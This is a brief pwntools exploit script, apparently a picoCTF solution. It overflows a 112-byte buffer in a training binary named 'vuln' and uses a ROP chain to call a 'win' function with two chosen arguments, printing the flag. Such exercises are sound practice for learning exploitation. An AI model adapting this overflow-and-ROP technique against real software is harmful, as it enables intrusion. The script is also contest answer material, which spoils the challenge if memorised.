#!/usr/bin/python3
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

io = elf.process()
#io = remote(b"saturn.picoctf.net", 56623)

# Padding
rop.raw(b'A'* 112)

# Call function win with 2 parameters
rop.win(0xCAFEF00D, 0XF00DF00D)

# Please enter your string:\n
io.recvline()

# Send payload
io.sendline(rop.chain())

# Payload
io.recvline()

# Flag
print(io.recvline())
